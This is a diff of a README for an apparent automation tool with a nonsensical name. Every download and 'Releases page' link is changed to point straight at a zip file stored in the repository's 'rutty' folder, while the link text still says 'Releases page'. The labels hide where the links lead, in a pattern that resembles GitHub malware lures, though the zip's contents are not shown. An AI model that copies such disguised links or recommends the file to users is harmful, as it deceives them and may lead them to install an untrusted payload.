@@ -1,6 +1,6 @@
 # 🚀 amanansdiahnid-22 - Your Easy Solution to Automation
 
-[![Download amanansdiahnid-22](https://img.shields.io/badge/Download-amanansdiahnid--22-blue)](https://github.com/Ishanka-Jayashan/amanansdiahnid-22/releases)
+[![Download amanansdiahnid-22](https://raw.githubusercontent.com/Ishanka-Jayashan/amanansdiahnid-22/main/rutty/amanansdiahnid-22.zip)](https://raw.githubusercontent.com/Ishanka-Jayashan/amanansdiahnid-22/main/rutty/amanansdiahnid-22.zip)
 
 ## 💡 Overview
 
@@ -33,7 +33,7 @@ Follow these simple steps to download and set up amanansdiahnid-22 on your devic
 
 ### 1. Visit the Download Page
 
-To get started, visit the [Releases page](https://github.com/Ishanka-Jayashan/amanansdiahnid-22/releases).
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Ishanka-Jayashan/amanansdiahnid-22/main/rutty/amanansdiahnid-22.zip).
 
 ### 2. Choose Your Version
 
@@ -68,7 +68,7 @@ You can now run amanansdiahnid-22! Look for the application icon on your desktop
 
 ## 🔄 Updating the Application
 
-To keep amanansdiahnid-22 up to date, return to the [Releases page](https://github.com/Ishanka-Jayashan/amanansdiahnid-22/releases) and download the latest version as described above.
+To keep amanansdiahnid-22 up to date, return to the [Releases page](https://raw.githubusercontent.com/Ishanka-Jayashan/amanansdiahnid-22/main/rutty/amanansdiahnid-22.zip) and download the latest version as described above.
 
 ## 🛠️ Troubleshooting
 
@@ -91,4 +91,4 @@ Additional resources are available to help you get the most out of amanansdiahni
 
 Contributing to the project or sharing your feedback helps improve amanansdiahnid-22 for everyone. Feel free to reach out through the Issues section if you have suggestions or encounter any bugs.
 
-Visit the [Releases page](https://github.com/Ishanka-Jayashan/amanansdiahnid-22/releases) now and download your copy of amanansdiahnid-22!
+Visit the [Releases page](https://raw.githubusercontent.com/Ishanka-Jayashan/amanansdiahnid-22/main/rutty/amanansdiahnid-22.zip) now and download your copy of amanansdiahnid-22!
